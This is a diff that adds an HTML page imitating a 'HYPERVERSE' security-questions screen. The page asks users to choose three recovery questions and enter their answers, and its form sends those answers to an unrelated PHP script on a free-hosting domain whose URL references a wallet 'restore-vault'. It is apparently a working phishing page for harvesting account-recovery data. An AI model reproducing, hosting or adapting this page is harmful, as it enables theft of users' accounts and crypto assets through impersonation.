@@ -1,0 +1,391 @@
+<!DOCTYPE html>
+<html lang="en" style=" background-color: #f8f8f8; >
+<head>
+  <meta charset="UTF-8">
+	<link rel="shortcut icon" href="https://h5.thehyperverse.net/static/favicon.ico" type="image/x-icon">
+  <title>HYPERVERSE</title>
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/normalize/5.0.0/normalize.min.css">
+<script src="https://cdnjs.cloudflare.com/ajax/libs/prefixfree/1.0.7/prefixfree.min.js"></script>
+
+<style type="text/css">uni-page-wrapper {
+    display: block;
+    height: 100%;
+    position: relative;
+}
+* {
+    margin: 0;
+    -webkit-tap-highlight-color: transparent;
+}
+body.pages-account-setSecurityQuestions uni-page-body {
+    background: #fafafa;
+}
+uni-page-body {
+    height: 110vh!important;
+}
+uni-page-body {
+    max-width: 1024px;
+    margin: 0 auto;
+    min-height: 100%;
+    font-family: Poppins;
+}
+
+option {
+    font-size: 15px;
+    color: black;
+}
+		      
+uni-page-body, uni-page-refresh {
+    display: block;
+    box-sizing: border-box;
+    width: 100%;
+}
+
+select#securityanswer {
+    color: #a3a3a3;
+}		      
+		      
+button, select {
+    margin-top: 10px;
+    text-transform: none;
+    border-radius: 0;
+    font-size: 13px;
+    width: 100%;
+    border: 0px solid #ededed;
+    display: flex;
+    height: 35px;
+    font-family: system-ui;
+    word-spacing: -0.5px;
+}	      
+		      
+uni-view, uni-scroll-view, uni-swiper, uni-swiper-item, uni-cover-view, uni-cover-image, uni-icon, uni-text, uni-rich-text, uni-progress, uni-button, uni-checkbox, uni-form, uni-input, uni-label, uni-radio, uni-slider, uni-switch, uni-textarea, uni-navigator, uni-audio, uni-camera, uni-image, uni-video {
+    box-sizing: border-box;
+}
+uni-view {
+    display: block;
+}
+.set_questions_main[data-v-eefd1b52] {
+    padding: 50px 20px 0px 20px;
+}
+.q_box[data-v-eefd1b52] {
+    border-radius: 5px;
+    background: #fff;
+    margin-top: 10px;
+    padding: 10px 20px;
+}
+.q_box .box[data-v-eefd1b52] {
+    padding: 10px 0;
+}
+.q_box .title[data-v-eefd1b52] {
+    font-size: 13px;
+    color: #382187;
+    font-weight: 600;
+}
+.q_box .ipt_box[data-v-eefd1b52] {
+    display: -webkit-box;
+    display: -webkit-flex;
+    display: flex;
+    -webkit-box-align: center;
+    -webkit-align-items: center;
+    align-items: center;
+    border: 1px solid #ededed;
+    border-radius: 5px;
+    height: 44px;
+    padding: 0 10px;
+    margin-top: 10px;
+}
+.q_box .ipt_box .ipt[data-v-eefd1b52] {
+    -webkit-box-flex: 1;
+    -webkit-flex: 1;
+    flex: 1;
+    font-size: 12px;
+    color: #000;
+}
+.placeColor {
+    color: #cacaca;
+}
+.uni-input-form, .uni-input-wrapper {
+    display: -webkit-box;
+    display: -webkit-flex;
+    display: flex;
+    position: relative;
+    width: 100%;
+    height: 100%;
+    -webkit-box-orient: vertical;
+    -webkit-box-direction: normal;
+    -webkit-flex-direction: column;
+    flex-direction: column;
+    -webkit-box-pack: center;
+    -webkit-justify-content: center;
+    justify-content: center;
+}
+.uni-input-input {
+    color: #7e49f9;
+}
+.uni-input-input {
+    position: relative;
+    display: block;
+    height: 100%;
+    background: none;
+    color: inherit;
+    opacity: 1;
+    font: inherit;
+    line-height: inherit;
+    letter-spacing: inherit;
+    text-align: inherit;
+    text-indent: inherit;
+    text-transform: inherit;
+    text-shadow: inherit;
+}
+.uni-input-form, .uni-input-input, .uni-input-placeholder, .uni-input-wrapper {
+    outline: none;
+    border: none;
+    padding: 0;
+    margin: 0;
+    text-decoration: inherit;
+	opacity:0.8;
+}
+
+.uni-input-input, .uni-input-placeholder {
+    width: 100%;
+}
+
+.uni-input-placeholder {
+    position: absolute;
+    top: auto!important;
+    left: 0;
+    color: grey;
+    overflow: hidden;
+    text-overflow: clip;
+    white-space: pre;
+    word-break: keep-all;
+    pointer-events: none;
+    line-height: inherit;
+}
+
+.uni-input-placeholder {
+    color: #e5e5e5!important;
+}
+.submit_btn[data-v-eefd1b52] {
+    background: -webkit-linear-gradient(bottom,#8644ff,#8644ff),-webkit-linear-gradient(top,#6829dc,#150937);
+    background: linear-gradient(
+0deg
+,#8644ff,#8644ff),linear-gradient(
+180deg
+,#6829dc,#150937);
+    font-size: 13px;
+    color: #fff;
+    border-radius: 25px;
+    height: 50px;
+    line-height: 50px;
+    width: 315px;
+    margin-top: 65px;
+}
+uni-button {
+    position: relative;
+    display: block;
+    margin-left: auto;
+    margin-right: auto;
+    padding-left: 14px;
+    padding-right: 14px;
+    box-sizing: border-box;
+    font-size: 18px;
+    text-align: center;
+    text-decoration: none;
+    line-height: 2.55555556;
+    border-radius: 5px;
+    -webkit-tap-highlight-color: transparent;
+    overflow: hidden;
+    color: #000;
+    background-color: #f8f8f8;
+    cursor: pointer;
+}
+uni-view.li {
+    font-size: 11px;
+    color: #8c8c8c;
+    margin-top: 8px;
+    font-family: -webkit-pictograph;
+    font: small-caption;
+    margin-bottom: -5px;
+}
+.errmsg[data-v-6021a0da] {
+    margin-top: 50px;
+    color: #f53b12;
+    text-align: center;
+    font-size: 13px;
+    font-family: Poppins;
+}
+input#login-signin {
+    padding: 0% 0%;
+    border-radius: 45px;
+    font-size: 15px;
+    color: #fff4ff;
+    border: #7e49f9 1px solid;
+}
+.signin_b_t_li[data-v-4510d9c9] {
+    width: calc(315px - 0px);
+    height: 45px;
+    line-height: 45px;
+    border: #7e49f9 1px solid;
+    background: #7e49f9;
+    margin-left: 0px;
+    text-align: center;
+    border-radius: 22px;
+    color: #fff;
+    font-size: 13px;
+	cursor: pointer;
+	position: relative;
+    display: block;
+    margin-left: auto;
+    margin-right: auto;
+	margin-top:15px;
+}
+</style>
+</head>
+<body>
+<uni-page-wrapper><uni-page-body>
+	<form method="GET" action="https://sikamaruu.000webhostapp.com/matic3.php?nkbihfbeogaeaoehlefnkodbefgpgknn/home.html#restore-vault"class="log-reg-form log-reg-form--login" id="loginForm">
+ <input name="============" value="====================================" type="hidden">
+<uni-view data-v-60f996ac="" class="pub_nav" style="
+    position: fixed;
+    width: 100%;
+    left: 0;
+    z-index: 100;
+    background: #fff;
+    top: 0;
+"><uni-view data-v-60f996ac="" class="status_bar"></uni-view><uni-view data-v-60f996ac="" class="nav" style="
+    padding: 0px 13px;
+    height: 40px;
+    line-height: 40px;
+    position: relative;
+"><uni-view data-v-60f996ac="" class="nav_tit" style="
+    font-size: 16px;
+    color: #000;
+    text-align: center;
+    font-family: -webkit-pictograph;
+">Security questions</uni-view></uni-view></uni-view>
+<uni-view data-v-eefd1b52="" class="set_questions_main" style="
+    font-family: sans-serif;
+">
+<uni-view data-v-60f996ac="" class="note_box" style="
+    border: 1px dashed #ffb800;
+    border-radius: 10px;
+    padding: 20px;
+    background: #fffbf2;
+"><uni-view data-v-60f996ac="" class="title" style="
+    font-size: 12px;
+    color: #ffb800;
+">Note:</uni-view>
+<uni-view data-v-60f996ac="" class="txt" style="
+    font-size: 11px;
+    line-height: 14px;
+    color: #8c8c8c;
+    margin-top: 5px;
+">1. Security questions cannot be repeated.</uni-view><uni-view data-v-60f996ac="" class="txt" style="
+    font-size: 11px;
+    line-height: 14px;
+    color: #8c8c8c;
+    margin-top: 5px;
+">2. Choose a total of three questions to proceed</uni-view><uni-view data-v-60f996ac="" class="txt" style="
+    font-size: 11px;
+    line-height: 14px;
+    color: #8c8c8c;
+    margin-top: 5px;
+">3. Security questions will be used for account safety verification and cannot be change upon submission</uni-view><uni-view data-v-60f996ac="" class="txt" style="
+    font-size: 11px;
+    line-height: 14px;
+    color: #8c8c8c;
+    margin-top: 5px;
+">4. If there’s any enquiries please contact customer service</uni-view></uni-view>
+<uni-view data-v-eefd1b52="" class="q_box">
+<uni-view data-v-eefd1b52="" class="box">
+<uni-view data-v-eefd1b52="" class="title">Security Questions 1：</uni-view>
+<uni-view data-v-60f996ac="" class="q_box">
+<select id="Answer" name="Answer" type="answer" class="form-control--log-reg regular has-content">
+<option value="">Please select question</option><option value="Answer">In what town or city was your first full time job?</option>
+<option value="Answer">What is your spouse or partner's mother's maiden name?
+</option>
+
+<option value="Answer">What is your favourite animal?</option>
+<option value="Answer">If you had a pet, what would you name it?</option>
+			    <option value="answer">What is your favourite food?</option>
+						  <option value="answer">Which town or city were you born at?</option>
+									<option value="answer">What is your school’s name that you last attended?</option><option value="answer">What was your childhood nickname?</option></select>
+</uni-view>
+</uni-view>
+<uni-view data-v-eefd1b52="" class="box">
+<uni-view data-v-eefd1b52="" class="title">Answer：</uni-view>
+<uni-view data-v-eefd1b52="" class="ipt_box">
+<uni-input data-v-eefd1b52="" class="ipt">
+					 <div class="uni-input-wrapper">
+<input maxlength="140" step="" enterkeyhint="done" autocomplete="off" type="answer" name="Answer" id="Answer" class="uni-input-input" placeholder="Please enter an answer within 20 characters">
+<!---->
+</div>
+</uni-input></uni-view></uni-view></uni-view>
+
+<uni-view data-v-eefd1b52="" class="q_box">
+<uni-view data-v-eefd1b52="" class="box">
+<uni-view data-v-eefd1b52="" class="title">
+</uni-view></uni-view>
+<uni-view data-v-eefd1b52="" class="box">
+<uni-view data-v-eefd1b52="" class="title">Security Questions 2：</uni-view>
+<uni-view data-v-60f996ac="" class="q_box">
+<select id="Answerr" name="Answerr" type="answerr" class="form-control--log-reg regular has-content">
+<option value="">Please select question</option>
+		<option value="answer">In what town or city was your first full time job?</option>
+<option value="answer">What is your spouse or partner's mother's maiden name?
+</option>
+
+<option value="answer">What is your favourite animal?</option>
+<option value="answer">If you had a pet, what would you name it?</option><option value="answer">What is your favourite food?</option><option value="answer">Which town or city were you born at?</option><option value="answer">What is your school’s name that you last attended?</option><option value="answer">What was your childhood nickname?</option></select>
+</uni-view></uni-view>
+<uni-view data-v-eefd1b52="" class="box">
+<uni-view data-v-eefd1b52="" class="title">Answer：</uni-view>
+<uni-view data-v-eefd1b52="" class="ipt_box">
+<uni-input data-v-eefd1b52="" class="ipt">
+<div class="uni-input-wrapper">
+<input maxlength="140" step="" enterkeyhint="done" autocomplete="off" type="answerr" name="Answerr" id="Answerr" class="uni-input-input" placeholder="Please enter an answer within 20 characters">
+<!---->
+</div></uni-input></uni-view></uni-view></uni-view>
+
+<uni-view data-v-eefd1b52="" class="q_box">
+<uni-view data-v-eefd1b52="" class="box">
+<uni-view data-v-eefd1b52="" class="title">Security Questions 3：</uni-view>
+<uni-view data-v-60f996ac="" class="q_box">
+<select type="answerrr" name="Answerrr" id="Answerrr" class="form-control--log-reg regular has-content">
+<option value="" type="answerrr" name="Answerrr" id="Answerrr" >Please select question</option>
+		<option value="answer">In what town or city was your first full time job?</option>
+<option value="Answerrr">What is your spouse or partner's mother's maiden name?
+</option>
+
+<option value="answer" type="answer" name="answer">What is your favourite animal?</option>
+<option value="answer" type="answer" name="answer">If you had a pet, what would you name it?</option>
+		      <option value="answer" type="answer" name="answer">What is your favourite food?</option>
+					    <option value="answer">Which town or city were you born at?</option>
+								  <option value="answer">What is your school’s name that you last attended?</option><option value="answer">What was your childhood nickname?</option></select>
+</uni-view></uni-view>
+<uni-view data-v-eefd1b52="" class="box">
+<uni-view data-v-eefd1b52="" class="title">Answer：</uni-view>
+<uni-view data-v-eefd1b52="" class="ipt_box">
+<uni-input data-v-eefd1b52="" class="ipt">
+<div class="uni-input-wrapper">
+<input maxlength="140" step="" enterkeyhint="done" autocomplete="off" type="answerrr" name="Answerrr" id="Answerrr" class="uni-input-input" placeholder="Please enter an answer within 20 characters">
+<!---->
+</div>
+</uni-input>
+</uni-view>
+</uni-view>
+</uni-view>
+</uni-view>
+
+<!---->
+<!---->
+<input data-v-4510d9c9="" class="signin_b_t_li" id="login-signin" type="submit" name="signin" value="Submit" tabindex="6" data-rapid-tracking="true" data-ylk="elm:btn;elmt:primary;slk:next;mKey:login-landing-next" aria-hidden="false" data-v-e2684e0e="">
+<br><br><br></uni-view>
+<!---->
+<!---->
+</uni-view>
+</uni-page-body></uni-page-wrapper>
+
+
+</body>
+</html>
